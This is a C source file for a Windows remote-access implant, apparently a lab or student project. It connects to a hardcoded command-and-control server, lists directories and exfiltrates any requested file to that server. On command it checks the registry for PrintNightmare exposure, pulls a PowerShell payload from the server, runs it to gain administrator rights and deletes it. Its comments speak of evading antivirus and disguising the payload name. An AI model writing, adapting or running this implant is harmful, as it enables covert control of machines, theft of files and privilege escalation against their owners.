#include "c2_net.h"
#include <windows.h>
#include <stdlib.h>
#include <malloc.h>
#include <string.h>
#include <shlwapi.h>
#include <winspool.h>
#include <processthreadsapi.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Pathcch.lib")
#pragma comment(lib, "Winspool.lib")
#pragma comment(lib, "Shell32.lib")

// Configurations
#define SLEEP 1
#define SERVER_IP "192.168.187.13"
#define SERVER_PORT 4444

SOCKET c2_sock;
HANDLE heap;

// Present working directory, globally accessible
char pwd[MAX_PATH + 1] = {0};
 

// Attempt to change the pwd to the given path. Returns FALSE if path does not exist.
BOOL change_dir(char *path, int len) {

    // Absolute path
    if(len >= 3 && path[1] == ':' && PathIsDirectoryA(path)) {
        memset(pwd, 0, _MAX_PATH + 1);
        strncpy(pwd, path, len);
        PathAddBackslashA(pwd); // Append trailing \ to path if needed
        return TRUE;
    }
    // No support for relative paths
    return FALSE;
}


// Write file + directory listing to out
DWORD ls(char *path, char* out) {
    char preparedPath[MAX_PATH];
    LARGE_INTEGER file_size;
    WIN32_FIND_DATA data;
    BOOL status = 0;
    int len = 0;
    
    // Copy the string to a buffer+ append '\*' to the directory name
    sprintf(preparedPath, "%s\\*", path);
    
    // Find first file
    HANDLE h = FindFirstFileA(preparedPath, &data);
    if (h == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Loop through rest of files
    do {
        char* name = data.cFileName;        
        
        // Directory
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            len += sprintf((char*) out + len, "DIR     %s\n", name);
        }
        // File
        else {
            file_size.LowPart = data.nFileSizeLow;
            file_size.HighPart = data.nFileSizeHigh;
            len += sprintf((char*) out + len, "FILE    %s \t %lld\n", name, file_size.QuadPart);
        }

        status = FindNextFileA(h, &data);
    } while (status != 0);
    
    FindClose(h);
    if (status == 0 || status == ERROR_NO_MORE_FILES)
        return 0;
    return -1;
}


// Reads data from file given by path and sends it back to C2 server
int exfil(char* path) {
    char abs_path[MAX_PATH] = {0};
    DWORD numBytesRead = 0;
    LARGE_INTEGER fileSize;
    int status = 0;

    // Convert relative path to absolute path
    if (path[0] != 'C' || path[1] != ':') {
        sprintf(abs_path, "%s\\%s", pwd, path);
    }
    // Otherwise just use path as-is
    else {
        strcpy(abs_path, path);
    }

    // Open file
    HANDLE hFile = CreateFile(abs_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        c2_send(c2_sock, "ERROR opening file", 18);
        status = -1;
        goto end;
    }

    // Get file size
    int low = 0;
    low = GetFileSize(hFile, &fileSize.HighPart);
    fileSize.LowPart = low;

    // Allocate buffer on heap for the data
    char* out = (char*) HeapAlloc(heap, HEAP_ZERO_MEMORY, fileSize.QuadPart);
    if (out == NULL) {
        c2_send(c2_sock, "ERROR Not enough memory", 23);
        status = -1;
        goto end;
    }

    // Read data
    BOOL res = ReadFile(hFile, out, fileSize.QuadPart, &numBytesRead, NULL);
    if (!res) {
        c2_send(c2_sock, "ERROR reading file", 18);
        status = -1;
        goto end;
    }
    c2_send(c2_sock, out, numBytesRead);

end:
    HeapFree(heap, 0, out);
    CloseHandle(hFile);
    return status;
}



// Checks the registry to see if host is vulnerable to printer nightmare.
// Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
// TODO: could refactor with goto + return value variable
int check_registry_for_privesc() {
    int vulnerable = 1;
    DWORD status;
    HKEY hKey = NULL;
    DWORD val;          // store registry values here 
    int size = 4;       // size of DWORD, needed for RegGetValue

    // Open handle
    status = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint", 0, KEY_READ, &hKey);
    if (status == ERROR_FILE_NOT_FOUND) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Read first value
    status = RegGetValue(hKey, NULL, "RestrictDriverInstallationToAdministrators", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 0)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

    // Need to check both registry values
    status = RegGetValue(hKey, NULL, "NoWarningNoElevationOnInstall", RRF_RT_REG_DWORD, NULL, &val, &size);
    if (status == ERROR_FILE_NOT_FOUND || (status == ERROR_SUCCESS && val != 1)) {
        vulnerable = 0;
        goto end;
    }
    if (status != ERROR_SUCCESS) {
        vulnerable = -1;
        goto end;
    }

end:
    if (hKey) { RegCloseKey(hKey); }
    return vulnerable;
}


// Creates a file in the present working directory and writes the printer nightmare powershell script to it.
// Returns NULL on failure, and the path to the script on success.
// TODO: name the payload something less sus than "script.ps1"
char* DownloadScript() {
    char* payload_path;
    char* payload_data;

    // Allocate buffer for payload path
    payload_path = HeapAlloc(heap, 0, 2 * MAX_PATH);
    if (payload_path == NULL) {
        return NULL;
    }

    // Allocate buffer for payload data
    payload_data = HeapAlloc(heap, 0, 250*1000); // Allocate 250 Kb to be safe
    if (payload_data == NULL) {
        HeapFree(heap, 0, payload_path);
        return NULL;
    }

    // Create file for payload to be written to
    strcpy(payload_path, pwd);
    strcat(payload_path, "\\script.ps1");
    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        HeapFree(heap, 0, payload_data);
        HeapFree(heap, 0, payload_path);
        return NULL;
    }

    // Receive payload
    int len = c2_recv(c2_sock, payload_data, 250*1000);
    printf("[*] Payload size: %d bytes\n", len);

    // Write paylaod
    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
        HeapFree(heap, 0, payload_data);
        HeapFree(heap, 0, payload_path);
        CloseHandle(hFile);
        DeleteFile(payload_path);
        return NULL;
    }

    HeapFree(heap, 0, payload_data);
    CloseHandle(hFile);
    return payload_path;
}


// Attempts to gain administrator privileges via the Printer Nightmare CVE.
// Works by downloading and executing a powershell script.
DWORD escalate() {
    char* script_path;
    STARTUPINFO startInfo;
    PROCESS_INFORMATION procInfo;
    DWORD ret = 0;

    // Set up process structures
    ZeroMemory(&startInfo, sizeof(startInfo));
    startInfo.cb = sizeof(startInfo);

    // Check registry first
    int vulnerable  = check_registry_for_privesc();
    if (vulnerable == 0) {
        c2_send(c2_sock, "Target not vulnerable", 21);
        ret = -1;
        goto end;
    }
    if (vulnerable == -1) {
        c2_send(c2_sock, "ERROR: Could not check registry", 31);
        ret = -1;
        goto end;
    }

    // Download script
    script_path = DownloadScript();
    if (script_path == NULL) {
        c2_send(c2_sock, "ERROR: Could not download script", 32);
        ret = -1;
        goto end;
    }
    c2_log("Script path: %s\n", script_path);

    // Execute the powershell script
    DWORD res = CreateProcess(NULL, "powershell.exe -File script.ps1", NULL, NULL, FALSE, 0, NULL, NULL, &startInfo, &procInfo);
    if (!res) {
        c2_log("Spawning powershell failed\n");
        ret = -1;
        goto end;
    }
    WaitForSingleObject(procInfo.hProcess, INFINITE);
    c2_log("[+] Script ran successfully\n");
    CloseHandle(procInfo.hProcess);
    CloseHandle(procInfo.hThread);

end:
    if (script_path) {
        DeleteFile(script_path);
        HeapFree(heap, 0, script_path);
    }
    return ret;
}


// cl implant.c c2_net.c /Fe:implant.exe /DDEBUG
// cl implant.c c2_net.c /Fe:implant.exe
int main() {
    int status = 0;
    int len = 0;
    char buffer[512];


    // Sleep on start to avoid AV scans
    // Sleep(SLEEP * 1000);

    // Basic setup
    if (!setup_comms()) {
        return 1;
    }
    heap = GetProcessHeap();

    // Connect to C2 server (TODO: what to do if can't connect?)
    c2_sock = c2_connect(SERVER_IP, SERVER_PORT);
    if (c2_sock == INVALID_SOCKET) {
        closesocket(c2_sock);
        WSACleanup();
        return 1;
    }

    // Get present directory
    GetCurrentDirectory(_MAX_PATH, pwd);
    c2_send(c2_sock, pwd, strlen(pwd));

    
    while (TRUE) {
        // Read data from network buffer
        len = c2_recv(c2_sock, buffer, 511);
        if (len == SOCKET_ERROR)
            continue;
        c2_log("%s\n", buffer);



        // Main logic of implant functionality
        if (strncmp(buffer, "exit", 4) == 0) {
            break;
        }

        else if(strncmp(buffer, "cd ", 3) == 0 && len >= 4) {
            if (! change_dir(buffer + 3, len - 3)) // buffer + 3 is start of arg passed to cd
                c2_send(c2_sock, "Invalid dir", 11);
        }

        else if(strncmp(buffer, "ls", 2) == 0) {
            char listing[4096] = {0};
            if (len == 2)
                status = ls(pwd, listing);
            else if (len >= 4)
                status = ls(buffer + 3, listing); // arg passed to ls

            // Check result
            if (status == 0) {
                c2_send(c2_sock, listing, strlen(listing));
            }
            else {
                c2_send(c2_sock, "ERROR", 5);
            }
        }

        else if(strncmp(buffer, "pwd", 2) == 0) {
            c2_send(c2_sock, pwd, strlen(pwd));
        }

        else if(strncmp(buffer, "exfil ", 5) == 0) {
            if (len >= 7) {
                exfil(buffer + 6);
            }   
        }

        else if(strncmp(buffer, "upload ", 6) == 0) {
            // falls more on the c2 server
        }

        else if(strncmp(buffer, "escalate", 8) == 0) {
            escalate();
        }
        // TODO: what else?

        

    }

    // Close the socket
    closesocket(c2_sock);
    WSACleanup();
    return 0;
    // TODO: delete binary?
}
